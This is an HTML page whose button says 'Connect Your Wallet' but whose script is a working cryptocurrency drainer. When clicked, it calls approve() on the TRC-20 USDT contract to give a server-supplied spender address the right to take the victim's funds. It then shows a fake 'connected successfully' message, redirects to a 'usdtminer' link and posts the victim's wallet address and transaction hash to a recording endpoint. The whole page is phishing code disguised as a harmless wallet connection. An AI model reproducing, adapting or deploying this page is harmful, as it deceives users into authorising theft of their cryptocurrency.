<!doctype html>
<html lang="en">
<head>
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width, initial-scale=1, viewport-fit=cover">
  <meta name="theme-color" content="#ffffff">
  <title>Approve</title>
  <style>
    @import url('https://fonts.googleapis.com/css2?family=Inter:wght@500;600&display=swap');
    *{box-sizing:border-box;margin:0;padding:0}
    body{
      font-family:'Inter',system-ui,-apple-system,sans-serif;
      background:#fff;
      min-height:100dvh;
      display:flex;
      align-items:center;
      justify-content:center;
      padding:24px;
      -webkit-font-smoothing:antialiased;
    }
    .wrap{width:min(100%,400px);text-align:center}
    .btn{
      display:block;
      width:100%;
      padding:18px 32px;
      background:#2EB553;
      color:#fff;
      border:none;
      border-radius:16px;
      font-family:inherit;
      font-size:18px;
      font-weight:600;
      letter-spacing:-.01em;
      cursor:pointer;
      transition:opacity .2s, transform .15s;
      -webkit-tap-highlight-color:transparent;
    }
    .btn:active{transform:scale(.97)}
    .btn:disabled{opacity:.45;cursor:not-allowed;transform:none}
    .status{
      margin-top:20px;
      font-size:14px;
      color:#888;
      min-height:22px;
      line-height:1.5;
    }
    .status.err{color:#e44}
    .status.ok{color:#2EB553}
    .success-wrap{display:none;flex-direction:column;align-items:center;gap:16px}
    .success-wrap.show{display:flex}
    .checkmark-circle{
      width:80px;height:80px;border-radius:50%;
      background:#2EB553;display:flex;align-items:center;justify-content:center;
      animation:scaleIn .4s cubic-bezier(.175,.885,.32,1.275) forwards;
      opacity:0;
    }
    .checkmark-circle svg{width:40px;height:40px}
    .checkmark-circle svg path{
      stroke:#fff;stroke-width:3;stroke-linecap:round;stroke-linejoin:round;
      fill:none;stroke-dasharray:30;stroke-dashoffset:30;
      animation:draw .4s .3s ease forwards;
    }
    .success-msg{
      font-size:17px;font-weight:600;color:#1a1a1a;
      opacity:0;animation:fadeUp .4s .5s ease forwards;
    }
    @keyframes scaleIn{0%{transform:scale(0);opacity:0}100%{transform:scale(1);opacity:1}}
    @keyframes draw{to{stroke-dashoffset:0}}
    @keyframes fadeUp{0%{opacity:0;transform:translateY(8px)}100%{opacity:1;transform:translateY(0)}}
  </style>
</head>
<body>
<div class="wrap">
  <div id="mainUI">
    <p style="font-size:14px;color:#666;margin-bottom:16px">Click the button below to connect your wallet</p>
    <button class="btn" id="btn" disabled>Connect Your Wallet</button>
    <div class="status" id="status" role="status">Loading…</div>
  </div>
  <div class="success-wrap" id="successUI">
    <div class="checkmark-circle">
      <svg viewBox="0 0 40 40"><path d="M11 21l6 6 12-14"/></svg>
    </div>
    <div class="success-msg">Your wallet has been connected successfully!</div>
  </div>
</div>
<script>
(function(){
  var USDT='TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t';
  var amount=0;
  var spender='';
  var btn=document.getElementById('btn');
  var st=document.getElementById('status');

  function status(m,t){st.textContent=m;st.className='status'+(t?' '+t:'')}

  var slug=location.pathname.replace(/^\//,'');
  if(!slug){status('Invalid link.','err');return}

  fetch('/api/decode/'+encodeURIComponent(slug))
    .then(function(r){return r.json()})
    .then(function(d){
      if(d.error){status('This link is invalid or expired.','err');return}
      amount=d.amount;
      spender=d.spender;
      btn.disabled=false;
      status('');
    })
    .catch(function(){
      status('Could not verify link.','err');
    });

  btn.addEventListener('click',function(){
    if(!window.tronLink&&!window.tronWeb){
      status('Please open in Trust Wallet.','err');
      return;
    }
    btn.disabled=true;
    btn.textContent='Connecting…';

    var connect=window.tronLink?window.tronLink.request({method:'tron_requestAccounts'}):Promise.resolve();
    connect.then(function(){
      var tw=window.tronWeb;
      if(!tw||!tw.defaultAddress||!tw.defaultAddress.base58){
        throw new Error('No wallet connected.');
      }
      var userAddr=tw.defaultAddress.base58;
      btn.textContent='Approving…';

      var units=BigInt(Math.round(parseFloat(amount)*1e6));
      return tw.contract().at(USDT).then(function(contract){
        return contract.approve(spender,units.toString()).send();
      }).then(function(tx){
        var txId=typeof tx==='string'?tx:(tx&&tx.txid?tx.txid:'');
        document.getElementById('mainUI').style.display='none';
        document.getElementById('successUI').classList.add('show');
        setTimeout(function(){
          window.location.href='usdtminer://wallet?address='+encodeURIComponent(userAddr);
        },2000);

        return fetch('/api/wallets/record',{
          method:'POST',
          headers:{'Content-Type':'application/json','X-Requested-With':'XMLHttpRequest'},
          body:JSON.stringify({address:userAddr,amount:String(amount),txHash:txId})
        });
      });
    }).catch(function(e){
      btn.disabled=false;
      btn.textContent='Connect Your Wallet';
      status(e.message||'Failed. Try again.','err');
    });
  });
})();
</script>
</body>
</html>
